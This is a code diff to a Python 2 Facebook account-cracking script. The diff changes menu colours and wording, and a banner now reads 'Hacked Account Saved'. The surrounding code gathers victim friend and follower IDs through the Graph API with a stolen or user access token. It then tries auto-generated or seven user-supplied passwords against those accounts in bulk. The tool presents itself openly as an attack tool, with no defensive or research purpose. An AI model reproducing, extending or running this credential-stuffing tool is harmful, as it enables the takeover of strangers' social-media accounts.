@@ -185,8 +185,8 @@ def log_fb():
         token = open('access_token.txt', 'r').read()
         menu()
     except (KeyError, IOError):
-        print logo
-        print ' \t        [\x1b[1;97m\x1b[1;41m  Put Facebook id/pass  \x1b[0m\x1b[1;93m]'.center(50)
+        logo()
+        print ' \t        [\x1b[1;97m\x1b[1;41m  Login with Your New Facebook Acc  \x1b[0m\x1b[1;93m]'.center(50)
         print ''
         uid = raw_input('\x1b[1;95m[+] Email: \x1b[1;93m')
         print ''
@@ -220,7 +220,7 @@ def token():
         menu()
     except (KeyError, IOError):
         logo()
-        print ' \t        [\x1b[1;97m\x1b[1;41m  Paste Token  \x1b[0m\x1b[1;93m]'.center(50)
+        print ' \t       [\x1b[1;97m\x1b[1;41m  Login with FB Token  \x1b[0m\x1b[1;93m]'.center(50)
         print ''
         print ''
         token = raw_input(' \x1b[1;95m[+] Token : \x1b[1;90m')
@@ -264,17 +264,17 @@ def menu():
     print ''
     print ' \t       [\x1b[1;97m\x1b[1;41m  Choose method  \x1b[0m\x1b[1;93m]'.center(50)
     print ''
-    print 47 * '\x1b[1;93m\xe2\x96\xac'
-    print '\x1b[1;95m[1] \x1b[1;92mCRACK WITH AUTO PASS\n'
-    print '\x1b[1;95m[2] \x1b[1;92mCRACK WITH CHOICE DIGIT PASS\n'
-    print '\x1b[1;93m[3] \x1b[1;92mBACK'
-    print 47 * '\x1b[1;93m\xe2\x96\xac'
+    print 47 * '\x1b[1;94m\xe2\x96\xac'
+    print '\x1b[1;95m[1] \x1b[1;96mCRACK WITH AUTO PASS\n'
+    print '\x1b[1;95m[2] \x1b[1;96mCRACK WITH MANUAL PASS\n'
+    print '\x1b[1;91m[3] \x1b[1;96mBACK'
+    print 47 * '\x1b[1;94m\xe2\x96\xac'
     print ''
     menu_option()
 
 
 def menu_option():
-    select = raw_input('\x1b[1;92mChoose option: \x1b[1;93m')
+    select = raw_input('\x1b[1;92m Select Option: \x1b[1;95m')
     if select == '1':
         crack()
     elif select == '2':
@@ -303,12 +303,11 @@ def crack():
     os.system('clear')
     logo()
     print ''
-    print ''
-    print 47 * '\x1b[1;93m\xe2\x96\xac'
-    print '\x1b[1;93m[1] \x1b[1;92mCRACK FROM PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
-    print '\x1b[1;93m[2] \x1b[1;92mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
-    print '\x1b[1;93m[0] \x1b[1;92mBACK'
-    print 47 * '\x1b[1;93m\xe2\x96\xac'
+    print 47 * '\x1b[1;94m\xe2\x96\xac'
+    print '\x1b[1;97m[1] \x1b[1;95mCRACK FROM PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
+    print '\x1b[1;97m[2] \x1b[1;95mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
+    print '\x1b[1;91m[0] \x1b[1;92mBACK'
+    print 47 * '\x1b[1;94m\xe2\x96\xac'
     print ''
     crack_select()
 
@@ -330,7 +329,7 @@ def crack_select():
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
             q = json.loads(r.text)
         except KeyError:
-            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
+            print '\t    \x1b[1;31mLogin id has checkpoint\x1b[0;97m'
             print ''
             raw_input(' Press enter to back')
             choice()
@@ -386,7 +385,7 @@ def crack_select():
     elif select == '2':
         os.system('clear')
         logo()
-        print ' \t       [\x1b[1;97m\x1b[1;41m  Put 3 idzz Links  \x1b[0m\x1b[1;93m]'.center(50)
+        print ' \t       [\x1b[1;97m\x1b[1;41m  Put 3 id Links  \x1b[0m\x1b[1;93m]'.center(50)
         print ''
         print ''
         idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
@@ -597,9 +596,9 @@ def crack_select():
     print ''
     print 54 * '\x1b[1;92m_'
     print ''
-    print ' \x1b[1;92mThe process has been completed'
-    print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
-    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: naimcp.txt'
+    print ' \x1b[1;95mThe process has been completed'
+    print ' \x1b[1;95mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
+    print ' \x1b[1;92mNote: Hacked Account Saved SDcard Folder: BaBycp.txt'
     print 54 * '_'
     print ''
     print ''
@@ -622,11 +621,11 @@ def choice():
     os.system('clear')
     logo()
     print ''
-    print 47 * '\x1b[1;93m\xe2\x96\xac'
-    print '\x1b[1;93m[1] \x1b[1;92mCRACK FROM PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
-    print '\x1b[1;93m[2] \x1b[1;92mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
-    print '\x1b[1;93m[0] \x1b[1;92mBACK'
-    print 47 * '\x1b[1;93m\xe2\x96\xac'
+    print 47 * '\x1b[1;94m\xe2\x96\xac'
+    print '\x1b[1;97m[1] \x1b[1;96mCRACK PUBLIC ID     \x1b[1;91m[ Crack 3 links ]\n'
+    print '\x1b[1;97m[2] \x1b[1;96mCRACK FOLLOWERS ID  \x1b[1;91m[ Crack 3 links ]\n'
+    print '\x1b[1;91m[0] \x1b[1;92mBACK'
+    print 47 * '\x1b[1;94m\xe2\x96\xac'
     print ''
     choice_select()
 
@@ -642,13 +641,13 @@ def choice_select():
         print ' \t  [\x1b[1;97m\x1b[1;41m  Put 7 passwords And 3 idzz Link  \x1b[0m\x1b[1;93m]'
         print ''
         print ''
-        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;92m ')
-        pass2 = raw_input('\x1b[1;93m[+] Password [2] :\x1b[1;92m ')
-        pass3 = raw_input('\x1b[1;93m[+] Password [3] :\x1b[1;92m ')
-        pass4 = raw_input('\x1b[1;93m[+] Password [4] :\x1b[1;92m ')
-        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;92m ')
-        pass6 = raw_input('\x1b[1;93m[+] Password [6] :\x1b[1;92m ')
-        pass7 = raw_input('\x1b[1;93m[+] Password [7] :\x1b[1;92m ')
+        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;93m ')
+        pass2 = raw_input('\x1b[1;92m[+] Password [2] :\x1b[1;92m ')
+        pass3 = raw_input('\x1b[1;91m[+] Password [3] :\x1b[1;91m ')
+        pass4 = raw_input('\x1b[1;97m[+] Password [4] :\x1b[1;90m ')
+        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;93m ')
+        pass6 = raw_input('\x1b[1;92m[+] Password [6] :\x1b[1;92m ')
+        pass7 = raw_input('\x1b[1;91m[+] Password [7] :\x1b[1;91m ')
         print ''
         idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
         
@@ -656,7 +655,7 @@ def choice_select():
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
             q = json.loads(r.text)
         except KeyError:
-            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
+            print '\t    \x1b[1;31mLogin id has checkpoint\x1b[0;97m'
             print ''
             raw_input(' Press enter to back')
             choice()
@@ -675,9 +674,9 @@ def choice_select():
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
             q = json.loads(r.text)
         except KeyError:
-            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
+            print '\t    \x1b[1;91mLogin id has checkpoint\x1b[0;97m'
             print ''
-            raw_input(' Press enter to back')
+            raw_input(' Press enter to Back')
             choice()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
